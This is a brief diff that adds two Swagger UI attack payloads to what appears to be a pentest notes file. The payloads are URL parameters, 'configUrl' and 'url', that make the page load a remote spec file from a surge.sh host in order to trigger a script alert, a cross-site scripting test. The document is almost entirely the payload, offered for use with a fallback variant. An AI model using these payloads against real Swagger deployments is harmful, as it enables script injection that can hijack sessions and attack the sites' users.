@@ -1,0 +1,5 @@
+>> You can use just add this parameter to the URL of Swagger and see if it pops an alert:
+?configUrl=https://jumpy-floor.surge.sh/test.json
+
+>> Sometimes the payload won’t work so check this one:
+?url=https://jumpy-floor.surge.sh/test.yaml
